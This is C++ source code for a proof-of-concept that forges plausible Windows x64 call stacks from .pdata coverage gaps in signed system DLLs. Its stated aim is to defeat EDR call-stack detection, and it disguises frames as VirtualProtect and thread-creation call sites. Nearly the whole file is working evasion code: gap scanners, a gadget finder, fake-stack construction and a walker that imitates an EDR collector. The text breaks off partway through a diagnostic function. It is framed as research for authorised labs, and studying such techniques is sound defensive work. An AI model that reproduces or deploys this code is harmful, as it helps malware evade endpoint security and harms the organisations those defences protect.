/*
 * lacuna.cpp - LACUNA Chain / Ghost Frames PoC (demonstration port).
 *
 * Technique: "LACUNA Chain: Ghost Frames - Forging Plausible Call Stacks from
 * .pdata Lacunae", Mohamed Alzhrani (0xmaz), 2026.
 *   paper:     https://0xmaz.me/posts/LACUNA-Chain-Ghost-Frames-defeats-All-EDR-layers-of-call-stack-based-detection/
 *   reference: https://github.com/MazX0p/LACUNA-Chain
 *
 * Idea (BYOUD-Gap):
 *   RtlVirtualUnwind, faced with a return address that has NO .pdata
 *   RUNTIME_FUNCTION coverage, does not abort - it treats the frame as a leaf
 *   function: next RIP = [RSP], RSP += 8.  The uncovered ranges between two
 *   RUNTIME_FUNCTION entries (".pdata lacunae") are executable, mapped from the
 *   signed image, and indistinguishable from a real leaf call site.  Chain N
 *   such gaps and an EDR/kernel stack collector walks N ghost frames that all
 *   resolve to signed Microsoft modules - with zero .pdata modification.
 *
 * This PoC is a *demonstration* (no injector). It shows, on a live host:
 *
 *   scan    - enumerate the lacunae across ntdll / kernelbase / wow64 / win32u,
 *             classify the "ghost functions" (gaps that contain real code), the
 *             8-byte NOP gaps in win32u, and the JMP [RBX] ghost gadgets.
 *   verify  - build the composite ghost chain
 *               L0 ntdll!KiUserExceptionDispatcher+4   BYOUD-MF anchor (UWOP_PUSH_MACHFRAME)
 *               L1 wow64.dll ghost                      (Wow64PrepareForException shadow)
 *               L2 kernelbase.dll ghost                 (VirtualProtect shadow)
 *               L3 ntdll.dll ghost                      (RtlCreateUserThread shadow)
 *               L4 win32u.dll NOP gap                   (whitelist-immune)
 *               L5 ntdll!RtlUserThreadStart+0x21        thread root
 *             and walk it exactly the way an EDR stack collector does
 *             (RtlLookupFunctionEntry + RtlVirtualUnwind), including the
 *             BYOUD-MF machine-frame RSP teleport from the L0 anchor.
 *
 * The same binary works regardless of build: every ghost address is located at
 * runtime by scanning the loaded image's .pdata; nothing is hard-coded.
 *
 * For authorised research / lab use only.
 */

#ifndef _WIN64
#  error "x64 only: .pdata / RtlVirtualUnwind call-stack spoofing is x64-specific"
#endif

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#ifndef UNW_FLAG_NHANDLER
#define UNW_FLAG_NHANDLER 0
#endif

/* ---------------------------------------------------------------- PE pieces */

/* RUNTIME_FUNCTION, op-for-op; own type so we don't depend on the arch macros */
typedef struct { uint32_t Begin, End, Unwind; } RF;

/* UNWIND_INFO header (4 bytes), then the UNWIND_CODE array follows */
typedef struct { uint8_t VF, Prolog, Count, Frame; } UH;

#define UWOP_PUSH_MACHFRAME 10   /* opcode 10: reads RSP from the stack */

typedef struct { uint64_t Rip, Cs, EFlags, Rsp, Ss; } MachFrame;  /* 40 bytes */

/* fake stack the collector gets to see (low -> high, stack grows down) */
typedef struct {
    uint64_t L5_thread_root;
    uint64_t L4_win32u;
    uint64_t L3_ntdll;
    uint64_t L2_kbase;
    uint64_t L1_wow64;
    MachFrame mf;              /* consumed by the UWOP_PUSH_MACHFRAME handler */
    uint64_t mf_trigger;       /* KiUserExceptionDispatcher+4 */
} LacunaStack;

/* the 4 return-address slots the leaf walk reads L2 -> L3 -> L4 -> L5 from */
static uint64_t g_mf_walk[4];

static LacunaStack *g_ls = NULL;

/* layer addresses, resolved at runtime */
static uint64_t g_L0 = 0, g_L1 = 0, g_L2 = 0, g_L3 = 0, g_L4 = 0, g_L5 = 0;
static uint64_t g_ntdll = 0, g_kbase = 0, g_wow64 = 0, g_win32u = 0;
static uint64_t g_mf_begin = 0;      /* BYOUD-MF host function */
static uint32_t g_mf_size = 0;

static HMODULE g_hNtdll, g_hKbase, g_hWow64, g_hWin32u;

/* ntdll unwind APIs, resolved dynamically */
typedef RF   *(*fn_LookupFE)(uint64_t, uint64_t *, void *);
typedef void  (*fn_Unwind)(uint32_t, uint64_t, uint64_t, RF *, CONTEXT *, void **,
                           uint64_t *, void *);
static fn_LookupFE pLookupFE;
static fn_Unwind   pUnwind;

/* ------------------------------------------------------------------ helpers */

static PIMAGE_NT_HEADERS64 nt_of(HMODULE m)
{
    uint8_t *b = (uint8_t *)m;
    return (PIMAGE_NT_HEADERS64)(b + ((PIMAGE_DOS_HEADER)b)->e_lfanew);
}

static bool pe_section(HMODULE m, const char *sname, uint64_t *va, uint32_t *sz)
{
    if (!m) return false;
    PIMAGE_NT_HEADERS64 nt = nt_of(m);
    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (strncmp((char *)s->Name, sname, 8) == 0) {
            *va = (uint64_t)m + s->VirtualAddress;
            *sz = s->Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

static uint64_t pe_export(HMODULE m, const char *fn)
{
    return m ? (uint64_t)GetProcAddress(m, fn) : 0;
}

static uint64_t teb_stack_base(void)
{
    uint64_t v;
    __asm__ volatile("movq %%gs:0x08, %0" : "=r"(v));   /* TEB.StackBase  */
    return v;
}
static uint64_t teb_stack_limit(void)
{
    uint64_t v;
    __asm__ volatile("movq %%gs:0x10, %0" : "=r"(v));   /* TEB.StackLimit */
    return v;
}
static uint64_t cur_rsp(void)
{
    uint64_t v;
    __asm__ volatile("movq %%rsp, %0" : "=r"(v));
    return v;
}

static void module_wide(uint64_t addr, wchar_t *out, size_t cch)
{
    HMODULE h = NULL;
    GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                       GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                       (LPCWSTR)addr, &h);
    if (!h) { wcsncpy(out, L"<unbacked>", cch); out[cch - 1] = 0; return; }
    wchar_t path[MAX_PATH] = { 0 };
    GetModuleFileNameW(h, path, MAX_PATH);
    const wchar_t *b = wcsrchr(path, L'\\');
    wcsncpy(out, b ? b + 1 : path, cch);
    out[cch - 1] = 0;
}

static void module_narrow(uint64_t addr, char *out, size_t cch)
{
    wchar_t w[128];
    module_wide(addr, w, 128);
    WideCharToMultiByte(CP_UTF8, 0, w, -1, out, (int)cch, NULL, NULL);
}

/* ------------------------------------------------------- .pdata gap scanner */

/* a ghost region - executable code with no RUNTIME_FUNCTION coverage */
struct Ghost {
    uint64_t va_start, va_end;
    uint32_t size;
    uint64_t export_va;
    uint32_t dist;
    char     name[64];
};

static int scan_ghosts(HMODULE mod, const char **targets, int n_t,
                       Ghost *out, int max)
{
    uint64_t pva; uint32_t psz;
    if (!pe_section(mod, ".pdata", &pva, &psz)) return 0;

    uint64_t tva[32] = { 0 };
    char tname[32][64];
    int n_targets = 0;
    for (int i = 0; i < n_t && n_targets < 32; i++) {
        uint64_t v = pe_export(mod, targets[i]);
        if (v) { tva[n_targets] = v; strncpy(tname[n_targets], targets[i], 63); n_targets++; }
    }

    RF *rf = (RF *)pva;
    int count = psz / sizeof(RF);
    uint64_t img = (uint64_t)mod, prev = 0;
    int found = 0;

    for (int i = 0; i < count && found < max; i++) {
        if (!rf[i].Unwind) continue;
        uint64_t begin = img + rf[i].Begin;
        uint64_t end   = img + rf[i].End;
        if (prev && begin > prev) {
            uint32_t sz = (uint32_t)(begin - prev);
            uint8_t *gp = (uint8_t *)prev;
            int nonpad = 0;
            for (uint32_t k = 0; k < sz && k < 512; k++)
                if (gp[k] != 0xCC && gp[k] != 0x00 && gp[k] != 0x90) nonpad++;
            if (nonpad > 4 && sz >= 8) {
                uint32_t best = 0xFFFFFFFFu; int bi = -1;
                for (int j = 0; j < n_targets; j++) {
                    uint32_t d = (tva[j] >= prev && tva[j] <= prev + sz) ? 0
                               : (tva[j] > prev + sz) ? (uint32_t)(tva[j] - (prev + sz))
                                                      : (uint32_t)(prev - tva[j]);
                    if (d < best) { best = d; bi = j; }
                }
                out[found].va_start  = prev;
                out[found].va_end    = prev + sz;
                out[found].size      = sz;
                out[found].export_va = bi >= 0 ? tva[bi] : 0;
                out[found].dist      = best;
                out[found].name[0]   = 0;
                if (bi >= 0) { strncpy(out[found].name, tname[bi], 63); out[found].name[63] = 0; }
                found++;
            }
        }
        prev = end;
    }
    return found;
}

/* total .pdata gaps and how many of them carry real code ("ghost functions") */
static void count_lacunae(HMODULE mod, uint32_t *total, uint32_t *ghosts,
                          uint64_t *ghost_bytes, uint32_t *largest)
{
    *total = *ghosts = *largest = 0; *ghost_bytes = 0;
    uint64_t pva; uint32_t psz;
    if (!pe_section(mod, ".pdata", &pva, &psz)) return;

    RF *rf = (RF *)pva;
    int count = psz / sizeof(RF);
    uint64_t img = (uint64_t)mod, prev = 0;
    for (int i = 0; i < count; i++) {
        if (!rf[i].Unwind) continue;
        uint64_t begin = img + rf[i].Begin;
        if (prev && begin > prev) {
            uint32_t sz = (uint32_t)(begin - prev);
            (*total)++;
            uint8_t *gp = (uint8_t *)prev;
            int nonpad = 0;
            for (uint32_t k = 0; k < sz && k < 512; k++)
                if (gp[k] != 0xCC && gp[k] != 0x00 && gp[k] != 0x90) nonpad++;
            if (nonpad > 4 && sz >= 8) {
                (*ghosts)++;
                *ghost_bytes += sz;
                if (sz > *largest) *largest = sz;
            }
        }
        prev = img + rf[i].End;
    }
}

static Ghost *best_ghost(Ghost *g, int n, const char *target)
{
    Ghost *best = NULL; uint32_t bd = 0xFFFFFFFFu;
    for (int i = 0; i < n; i++)
        if (strcmp(g[i].name, target) == 0 && g[i].dist < bd)
            { bd = g[i].dist; best = &g[i]; }
    return best;
}

/* --------------- win32u: uniform 8-byte NOP gaps between syscall stubs ------ */

static const uint8_t NOP8[8] = { 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00 };

static uint64_t win32u_nop_gap(HMODULE m)
{
    if (!m) return 0;
    uint64_t pva; uint32_t psz;
    if (pe_section(m, ".pdata", &pva, &psz)) {
        RF *rf = (RF *)pva;
        int count = psz / sizeof(RF);
        uint64_t img = (uint64_t)m, prev = 0;
        for (int i = 0; i < count; i++) {
            if (!rf[i].Unwind) continue;
            uint64_t begin = img + rf[i].Begin;
            if (prev && begin > prev) {
                uint32_t gap = (uint32_t)(begin - prev);
                if (gap >= 4 && gap <= 16) {
                    uint8_t *gp = (uint8_t *)prev;
                    bool ok;
                    if (gap == 8 && memcmp(gp, NOP8, 8) == 0) {
                        ok = true;
                    } else {
                        ok = true;
                        for (uint32_t k = 0; k < gap; k++)
                            if (gp[k] != 0x00 && gp[k] != 0xCC && gp[k] != 0x90)
                                { ok = false; break; }
                    }
                    if (ok) return prev;
                }
            }
            prev = img + rf[i].End;
        }
    }
    /* fallback: raw scan for the 8-byte NOP inside an executable section */
    PIMAGE_NT_HEADERS64 nt = nt_of(m);
    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (!(s->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        uint8_t *p = (uint8_t *)m + s->VirtualAddress;
        uint32_t sz = s->Misc.VirtualSize;
        for (uint32_t j = 0; j + 8 <= sz; j++)
            if (memcmp(p + j, NOP8, 8) == 0) return (uint64_t)(p + j);
    }
    return 0;
}

/* ---------------- BYOUD-MF: find a UWOP_PUSH_MACHFRAME (opcode 10) frame ----- */

static int unwind_slots(uint8_t op, uint8_t opinfo)
{
    switch (op) {
    case 0:  return 1;                        /* UWOP_PUSH_NONVOL        */
    case 1:  return opinfo == 0 ? 2 : 3;      /* UWOP_ALLOC_LARGE        */
    case 2:  return 1;                        /* UWOP_ALLOC_SMALL        */
    case 3:  return 1;                        /* UWOP_SET_FPREG          */
    case 4:  return 2;                        /* UWOP_SAVE_NONVOL        */
    case 5:  return 3;                        /* UWOP_SAVE_NONVOL_FAR    */
    case 8:  return 2;                        /* UWOP_SAVE_XMM128        */
    case 9:  return 3;                        /* UWOP_SAVE_XMM128_FAR    */
    case 10: return 1;                        /* UWOP_PUSH_MACHFRAME     */
    default: return 1;
    }
}

/* BYOUD-MF anchor selection is self-validating: we walk the candidate ControlPc
   through RtlVirtualUnwind and only accept the one whose machine-frame teleport
   lands the RSP on our L2..L5 chain, i.e. the whole downstream chain is reached. */

static int silent_walk(uint64_t startRip, uint64_t startRsp,
                       const uint64_t *addrs, int n)
{
    CONTEXT c;
    memset(&c, 0, sizeof(c));
    c.ContextFlags = CONTEXT_FULL;
    c.Rip = startRip;
    c.Rsp = startRsp;

    bool seen[8] = { false };
    int hits = 0;
    for (int i = 0; i < 32 && c.Rip; i++) {
        uint64_t ib = 0;
        RF *rf = pLookupFE(c.Rip, &ib, NULL);
        for (int k = 0; k < n; k++)
            if (addrs[k] == c.Rip && !seen[k]) { seen[k] = true; hits++; }
        if (hits == n) return hits;
        if (!rf) {
            c.Rip = *(uint64_t *)c.Rsp;
            c.Rsp += 8;
        } else {
            void *hd = NULL; uint64_t ef = 0;
            pUnwind(UNW_FLAG_NHANDLER, ib, c.Rip, rf, &c, &hd, &ef, NULL);
        }
    }
    return hits;
}

static uint64_t select_mf_anchor(void)
{
    uint64_t pva; uint32_t psz;
    if (!pe_section(g_hNtdll, ".pdata", &pva, &psz)) return 0;

    const uint64_t tail[5] = { g_L1, g_L2, g_L3, g_L4, g_L5 };
    RF *rf = (RF *)pva;
    int count = psz / sizeof(RF);
    uint64_t img = (uint64_t)g_hNtdll;

    for (int i = 0; i < count; i++) {
        if (!rf[i].Unwind) continue;
        UH *uh = (UH *)(img + rf[i].Unwind);
        uint8_t *codes = (uint8_t *)uh + 4;

        /* does this function carry a UWOP_PUSH_MACHFRAME opcode? */
        bool has_mf = false;
        int j = 0;
        while (j < uh->Count) {
            uint8_t op = codes[j * 2 + 1] & 0x0F, oi = codes[j * 2 + 1] >> 4;
            if (op == UWOP_PUSH_MACHFRAME) { has_mf = true; break; }
            j += unwind_slots(op, oi);
        }
        if (!has_mf) continue;

        uint64_t begin = img + rf[i].Begin, end = img + rf[i].End;
        for (uint64_t pc = begin; pc < end; pc++) {
            uint64_t ib = 0;
            RF *fr = pLookupFE(pc, &ib, NULL);
            if (!fr) continue;
            if (silent_walk(pc, (uint64_t)&g_ls->mf, tail, 5) == 5) {
                g_mf_begin = begin;
                g_mf_size  = (uint32_t)(end - begin);
                return pc;
            }
        }
    }
    return 0;
}

/* ----------------------------- ghost gadget: JMP [RBX] (FF 23) in a gap ----- */

struct GhostGadget { uint64_t va; char parent[80]; };

static int scan_ghost_gadgets(Ghost *ghosts, int n, const char *mod,
                              GhostGadget *out, int max)
{
    int found = 0;
    for (int i = 0; i < n && found < max; i++) {
        uint8_t *p = (uint8_t *)ghosts[i].va_start;
        uint32_t sz = ghosts[i].size;
        for (uint32_t k = 0; k + 1 < sz; k++) {
            if (p[k] == 0xFF && p[k + 1] == 0x23) {           /* jmp [rbx] */
                out[found].va = ghosts[i].va_start + k;
                snprintf(out[found].parent, sizeof(out[found].parent),
                         "%s ghost @%llx", mod,
                         (unsigned long long)ghosts[i].va_start);
                found++;
                if (found >= max) break;
            }
        }
    }
    return found;
}

/* --------------------------------------------------------- chain construction */

static Ghost g_ng[512], g_kg[512], g_wg[64];
static int   n_ng, n_kg, n_wg;
static uint64_t g_gg_ntdll = 0, g_gg_kbase = 0;

static bool build_chain(void)
{
    g_hNtdll  = GetModuleHandleA("ntdll.dll");
    g_hKbase  = GetModuleHandleA("kernelbase.dll");
    g_hWow64  = GetModuleHandleA("wow64.dll");
    g_hWin32u = GetModuleHandleA("win32u.dll");
    if (!g_hWin32u) g_hWin32u = LoadLibraryA("win32u.dll");
    if (!g_hWow64)  g_hWow64  = LoadLibraryA("wow64.dll");

    g_ntdll  = (uint64_t)g_hNtdll;
    g_kbase  = (uint64_t)g_hKbase;
    g_wow64  = (uint64_t)g_hWow64;
    g_win32u = (uint64_t)g_hWin32u;

    static const char *nt_t[]  = { "RtlCreateUserThread", "NtAllocateVirtualMemory",
                                   "LdrLoadDll", "NtCreateThreadEx", "RtlUserThreadStart" };
    static const char *kb_t[]  = { "VirtualProtect", "VirtualAllocEx",
                                   "WriteProcessMemory", "CreateRemoteThreadEx" };
    static const char *w64_t[] = { "Wow64PrepareForException",
                                   "Wow64KiUserCallbackDispatcher", "Wow64ApcRoutine" };

    n_ng = scan_ghosts(g_hNtdll, nt_t, 5, g_ng, 512);
    n_kg = scan_ghosts(g_hKbase, kb_t, 4, g_kg, 512);
    n_wg = g_hWow64 ? scan_ghosts(g_hWow64, w64_t, 3, g_wg, 64) : 0;

    /* ghost gadgets (dual-use leaf frames) */
    GhostGadget gg[8];
    int ngg = scan_ghost_gadgets(g_ng, n_ng, "ntdll", gg, 8);
    if (ngg) g_gg_ntdll = gg[0].va;
    ngg = scan_ghost_gadgets(g_kg, n_kg, "kernelbase", gg, 8);
    if (ngg) g_gg_kbase = gg[0].va;

    /* -- L1: wow64 ghost; fall back to an ntdll ghost on native x64 -- */
    Ghost *g1 = best_ghost(g_wg, n_wg, "Wow64PrepareForException");
    if (!g1) g1 = best_ghost(g_wg, n_wg, "Wow64KiUserCallbackDispatcher");
    if (g1) {
        g_L1 = g1->va_start + g1->size / 2;
    } else {
        Ghost *g3pre = best_ghost(g_ng, n_ng, "RtlCreateUserThread");
        if (!g3pre) g3pre = best_ghost(g_ng, n_ng, "NtAllocateVirtualMemory");
        Ghost *bf = NULL; uint32_t bd = 0xFFFFFFFFu;
        for (int k = 0; k < n_ng; k++) {
            if (g3pre && &g_ng[k] == g3pre) continue;
            if (g_ng[k].dist < bd) { bd = g_ng[k].dist; bf = &g_ng[k]; }
        }
        if (!bf) bf = g3pre;
        g1 = bf;
        g_L1 = bf ? (bf->va_start + bf->size / 2) : (g_ntdll + 0x50F80);
    }

    /* -- L2: kernelbase ghost near VirtualProtect (or the ghost gadget) -- */
    Ghost *g2 = best_ghost(g_kg, n_kg, "VirtualProtect");
    if (!g2) g2 = best_ghost(g_kg, n_kg, "VirtualAllocEx");
    g_L2 = g_gg_kbase ? g_gg_kbase
         : g2 ? (g2->va_start + g2->size / 2) : (g_kbase + 0x64180);

    /* -- L3: ntdll ghost near RtlCreateUserThread (or the ghost gadget) -- */
    Ghost *g3 = best_ghost(g_ng, n_ng, "RtlCreateUserThread");
    if (!g3) g3 = best_ghost(g_ng, n_ng, "NtAllocateVirtualMemory");
    g_L3 = g_gg_ntdll ? g_gg_ntdll
         : g3 ? (g3->va_start + g3->size / 2) : (g_ntdll + 0x50F80);

    /* -- L4: win32u NOP gap -- */
    g_L4 = g_hWin32u ? win32u_nop_gap(g_hWin32u)
                     : (n_ng ? g_ng[0].va_start + 4 : 0);

    /* -- L5: thread root -- */
    g_L5 = pe_export(g_hNtdll, "RtlUserThreadStart");
    if (g_L5) g_L5 += 0x21;

    if (!g_L1 || !g_L2 || !g_L3 || !g_L4 || !g_L5)
        return false;

    /* ---- materialise the fake stack ---- */
    g_ls = (LacunaStack *)VirtualAlloc(NULL, sizeof(LacunaStack) + 0x100,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_ls) return false;

    g_ls->L5_thread_root = g_L5;
    g_ls->L4_win32u      = g_L4;
    g_ls->L3_ntdll       = g_L3;
    g_ls->L2_kbase       = g_L2;
    g_ls->L1_wow64       = g_L1;
    g_ls->mf.Rip         = g_L1;          /* frame reached after the teleport */
    g_ls->mf.Cs          = 0x0033;
    g_ls->mf.EFlags      = 0x00000202;
    g_ls->mf.Rsp         = (uint64_t)&g_mf_walk[0]; /* RSP lands on the L2..L5 chain */
    g_ls->mf.Ss          = 0x002B;

    /* ascending-address order so the leaf RSP+=8 walk reads the right slot */
    g_mf_walk[0] = g_L2;
    g_mf_walk[1] = g_L3;
    g_mf_walk[2] = g_L4;
    g_mf_walk[3] = g_L5;

    /* -- L0: BYOUD-MF anchor, self-validated against the chain we just built -- */
    g_L0 = select_mf_anchor();
    if (!g_L0) {
        uint64_t ked = pe_export(g_hNtdll, "KiUserExceptionDispatcher");
        g_L0 = ked ? ked + 4 : 0;
    }
    g_ls->mf_trigger = g_L0;

    return true;
}

/* ------------------------------------------------------------------- walker */

struct Lyr { uint64_t va; const char *name; };

static bool walk_pass(const char *title, uint64_t startRip, uint64_t startRsp,
                      const Lyr *layers, int nLayers)
{
    printf("\n[*] %s\n", title);
    printf("      %-4s %-18s %-16s %-22s %s\n",
           "#", "RIP", "MODULE", "UNWIND", "LABEL");
    printf("      ------------------------------------------------------------------------\n");

    CONTEXT c;
    memset(&c, 0, sizeof(c));
    c.ContextFlags = CONTEXT_FULL;
    c.Rip = startRip;
    c.Rsp = startRsp;

    bool seen[8] = { false };
    int hits = 0;
    bool complete = false;

    for (int i = 0; i < 32 && c.Rip; i++) {
        uint64_t imgbase = 0;
        RF *rf = pLookupFE(c.Rip, &imgbase, NULL);

        char mod[64];
        module_narrow(c.Rip, mod, sizeof(mod));

        int li = -1;
        for (int k = 0; k < nLayers; k++)
            if (layers[k].va == c.Rip) { li = k; break; }
        if (li >= 0) { seen[li] = true; hits++; }

        printf("      %-4d %016llx %-16s %-22s %s\n",
               i, (unsigned long long)c.Rip, mod,
               rf ? "rf  (function)" : "GHOST (leaf, RSP+=8)",
               li >= 0 ? layers[li].name : "");

        if (hits == nLayers) { complete = true; break; }

        if (!rf) {
            c.Rip = *(uint64_t *)c.Rsp;      /* leaf: return addr is at [RSP] */
            c.Rsp += 8;
        } else {
            void *hd = NULL; uint64_t ef = 0;
            pUnwind(UNW_FLAG_NHANDLER, imgbase, c.Rip, rf, &c, &hd, &ef, NULL);
        }
    }

    printf("\n");
    for (int k = 0; k < nLayers; k++)
        printf("      %s %s\n", seen[k] ? "[+]" : "[ ]", layers[k].name);
    printf("\n      %s %d/%d layers reached\n",
           complete ? "[+]" : "[!]", hits, nLayers);
    return complete;
}

/* ------------------------------------------------------------- scan command */

static void scan_dll(const char *name, HMODULE m, const char **targets, int nT)
{
    if (!m) { printf("\n  %-16s  (not loaded)\n", name); return; }

    uint32_t total, ghosts, largest; uint64_t ghost_bytes;
    count_lacunae(m, &total, &ghosts, &ghost_bytes, &largest);
    printf("\n  %-16s  lacunae=%-5u  ghost-funcs=%-5u  (%llu bytes of code)  largest=%uB\n",
           name, total, ghosts, (unsigned long long)ghost_bytes, largest);

    Ghost buf[512];
    int n = scan_ghosts(m, targets, nT, buf, 512);
    for (int j = 0; j < n && j < 8; j++)
        printf("      %016llx-%016llx  %5uB  %-28s dist=%u\n",
               (unsigned long long)buf[j].va_start, (unsigned long long)buf[j].va_end,
               buf[j].size, buf[j].name[0] ? buf[j].name : "-", buf[j].dist);
    if (n > 8) printf("      ... %d more ghost regions\n", n - 8);

    GhostGadget gg[16];
    int ngg = scan_ghost_gadgets(buf, n, name, gg, 16);
    for (int j = 0; j < ngg && j < 4; j++)
        printf("      ghost gadget JMP [RBX] : %016llx  (%s)\n",
               (unsigned long long)gg[j].va, gg[j].parent);
}

static void do_scan(void)
{
    static const char *nt_t[]  = { "NtAllocateVirtualMemory", "NtCreateThreadEx",
                                   "RtlCreateUserThread", "LdrLoadDll", "RtlUserThreadStart" };
    static const char *kb_t[]  = { "VirtualProtect", "VirtualAllocEx",
                                   "WriteProcessMemory", "CreateRemoteThreadEx" };
    static const char *w64_t[] = { "Wow64PrepareForException",
                                   "Wow64KiUserCallbackDispatcher", "Wow64ApcRoutine" };
    static const char *w32_t[] = { "NtGdiDdDDICreateDevice", "NtUserCallNoParam" };

    /* win32u / wow64 are not always mapped yet - pull them in */
    if (!GetModuleHandleA("win32u.dll")) LoadLibraryA("win32u.dll");
    if (!GetModuleHandleA("wow64.dll"))  LoadLibraryA("wow64.dll");

    printf("\n[*] .pdata lacunae across the loaded images\n");

    scan_dll("ntdll.dll",      GetModuleHandleA("ntdll.dll"),      nt_t,  5);
    scan_dll("kernelbase.dll", GetModuleHandleA("kernelbase.dll"), kb_t,  4);
    scan_dll("wow64.dll",      GetModuleHandleA("wow64.dll"),      w64_t, 3);
    scan_dll("win32u.dll",     GetModuleHandleA("win32u.dll"),     w32_t, 2);

    HMODULE w = GetModuleHandleA("win32u.dll");
    if (w) printf("\n  win32u NOP gap        : %016llx\n",
                  (unsigned long long)win32u_nop_gap(w));
}

/* ----------------------------------------------------------- verify command */

static void print_chain(void)
{
    char mod[64];

    printf("\n[*] composed ghost chain (all addresses located at runtime)\n\n");

    module_narrow(g_L0, mod, sizeof(mod));
    printf("      L0  %016llx  %-16s  BYOUD-MF anchor (UWOP_PUSH_MACHFRAME)\n",
           (unsigned long long)g_L0, mod);
    module_narrow(g_L1, mod, sizeof(mod));
    printf("      L1  %016llx  %-16s  ghost / wow64 exception-prep shadow\n",
           (unsigned long long)g_L1, mod);
    module_narrow(g_L2, mod, sizeof(mod));
    printf("      L2  %016llx  %-16s  ghost / VirtualProtect return-site cover\n",
           (unsigned long long)g_L2, mod);
    module_narrow(g_L3, mod, sizeof(mod));
    printf("      L3  %016llx  %-16s  ghost / thread-creation semantic layer\n",
           (unsigned long long)g_L3, mod);
    module_narrow(g_L4, mod, sizeof(mod));
    printf("      L4  %016llx  %-16s  win32u NOP gap (whitelist-immune)\n",
           (unsigned long long)g_L4, mod);
    module_narrow(g_L5, mod, sizeof(mod));
    printf("      L5  %016llx  %-16s  RtlUserThreadStart+0x21 (thread root)\n",
           (unsigned long long)g_L5, mod);
}

static void verify_lacunae(void)
{
    printf("\n[*] gap validation - RtlLookupFunctionEntry on each ghost layer\n\n");

    struct { const char *name; uint64_t va; int must_be_gap; } L[6] = {
        { "L0 MF anchor", g_L0, 0 },
        { "L1 ghost",     g_L1, 1 },
        { "L2 ghost",     g_L2, 1 },
        { "L3 ghost",     g_L3, 1 },
        { "L4 nop gap",   g_L4, 1 },
        { "L5 root",      g_L5, 0 },
    };
    for (int i = 0; i < 6; i++) {
        uint64_t img = 0;
        RF *rf = pLookupFE(L[i].va, &img, NULL);
        bool is_gap = (rf == NULL);
        const char *verdict = is_gap ? "leaf (no RUNTIME_FUNCTION)" : "inside a function";
        const char *ok = (is_gap == L[i].must_be_gap) ? "[+]" : "[!]";
        printf("      %s %-12s %016llx  %s\n", ok, L[i].name,
               (unsigned long long)L[i].va, verdict);
    }

    if (g_mf_begin)
        printf("\n      BYOUD-MF frame      : %016llx  (%u bytes, opcode UWOP_PUSH_MACHFRAME)\n",
               (unsigned long long)g_mf_begin, g_mf_size);
}

static void do_verify(void)
{
    if (!build_chain()) {
        printf("[!] could not build the ghost chain on this image set\n");
        return;
    }

    printf("\n// [0] environment\n");
    printf("      ntdll.dll        : %016llx\n", (unsigned long long)g_ntdll);
    printf("      kernelbase.dll   : %016llx\n", (unsigned long long)g_kbase);
    printf("      wow64.dll        : %016llx\n", (unsigned long long)g_wow64);
    printf("      win32u.dll       : %016llx\n", (unsigned long long)g_win32u);

    printf("\n// [1] BYOUD-RT - thread stack bounds read from the TEB\n");
    printf("      TEB.StackBase    : %016llx\n", (unsigned long long)teb_stack_base());
    printf("      TEB.StackLimit   : %016llx\n", (unsigned long long)teb_stack_limit());
    printf("      current RSP      : %016llx\n", (unsigned long long)cur_rsp());
    printf("      consumed depth   : %llu bytes (StackBase - RSP, no pre-calibration)\n",
           (unsigned long long)(teb_stack_base() - cur_rsp()));

    printf("\n// [2] ghost scan\n");
    printf("      ntdll            : %d ghost regions\n", n_ng);
    printf("      kernelbase       : %d ghost regions\n", n_kg);
    printf("      wow64            : %d ghost regions\n", n_wg);
    printf("      ghost gadget ntdll      : %s\n",
           g_gg_ntdll ? "found (JMP [RBX])" : "none");
    printf("      ghost gadget kernelbase : %s\n",
           g_gg_kbase ? "found (JMP [RBX])" : "none");

    print_chain();

    printf("\n// [3] EDR view - walking the chain the way a stack collector does\n");
    verify_lacunae();

    /* pass 1: plain BYOUD-Gap leaf walk (L1 -> L2 -> L3 -> L4 -> L5) */
    static Lyr pass1[5];
    pass1[0] = { g_L1, "L1 wow64 ghost" };
    pass1[1] = { g_L2, "L2 kernelbase ghost" };
    pass1[2] = { g_L3, "L3 ntdll ghost" };
    pass1[3] = { g_L4, "L4 win32u nop gap" };
    pass1[4] = { g_L5, "L5 RtlUserThreadStart+0x21" };
    bool p1 = walk_pass("pass 1 - BYOUD-Gap (every ghost frame is a leaf, RSP+=8)",
                        g_L1, (uint64_t)&g_mf_walk[0], pass1, 5);

    /* pass 2: BYOUD-MF machine-frame RSP teleport from L0 */
    static Lyr pass2[6];
    pass2[0] = { g_L0, "L0 mf anchor (KiUserExceptionDispatcher)" };
    pass2[1] = { g_L1, "L1 wow64 ghost" };
    pass2[2] = { g_L2, "L2 kernelbase ghost" };
    pass2[3] = { g_L3, "L3 ntdll ghost" };
    pass2[4] = { g_L4, "L4 win32u nop gap" };
    pass2[5] = { g_L5, "L5 RtlUserThreadStart+0x21" };
    bool p2 = walk_pass("pass 2 - BYOUD-MF (UWOP_PUSH_MACHFRAME teleports RSP in one frame)",
                        g_L0, (uint64_t)&g_ls->mf, pass2, 6);

    printf("\n=====================================================================\n");
    printf(" %s plain ghost chain (5/5) %s\n", p1 ? "[+]" : "[!]", p1 ? "clean" : "partial");
    printf(" %s BYOUD-MF teleport    (6/6) %s\n", p2 ? "[+]" : "[!]", p2 ? "clean" : "partial");
    printf(" every frame resolves to a signed Microsoft module;\n");
    printf(" not one byte of .pdata was modified - the gaps were already there.\n");
    printf("=====================================================================\n");
}

/* --------------------------------------------------- mfprobe (diagnostic) */

static void do_mfprobe(void)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    uint64_t pva; uint32_t psz;
    if (!pe_section(ntdll, ".pdata", &pva, &psz)) { printf("[!] no .pdata\n"); return; }
    RF *rf = (RF *)pva; int count = psz / sizeof(RF); uint64_t img = (uint64_t)ntdll;

